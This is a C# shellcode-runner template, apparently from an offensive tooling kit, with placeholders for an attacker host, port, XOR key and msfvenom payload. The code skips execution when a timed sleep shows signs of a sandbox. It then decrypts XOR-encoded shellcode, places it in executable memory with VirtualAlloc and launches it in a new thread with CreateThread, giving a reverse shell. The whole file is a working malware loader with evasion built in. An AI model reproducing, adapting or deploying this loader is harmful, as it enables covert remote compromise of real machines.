// Simple XOR-Encrypted Shellcode Runner
// Technique: VirtualAlloc + CreateThread
// Features: Sleep-based sandbox detection, XOR decryption
// Payload: {{ lhost }}:{{ lport }}

using System.Runtime.InteropServices;
using System;

namespace rev
{
    public class Program
    {
        public const uint EXECUTEREADWRITE  = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);
        
        public static void Main()
        {
            // Sandbox evasion: Sleep for 10 seconds and verify time actually passed
            // Sandboxes often skip sleep to speed up analysis
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // XOR-encrypted shellcode
            // Generated by msfvenom, encrypted with key 0x{{ xor_key }}
{{ csharp_payload | indent(12) }}

            int payloadSize = buf.Length;
            
            // Allocate RWX memory for shellcode
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);
            
            // Decrypt XOR-encoded shellcode in place
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0x{{ xor_key }});
            }
            
            // Copy decrypted shellcode to allocated memory
            Marshal.Copy(buf, 0, payAddr, payloadSize);
            
            // Execute shellcode in new thread
            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);
            
            // Wait for shellcode thread to complete
            int waitResult = WaitForSingleObject(payThreadId, -1);
        }
    }
}
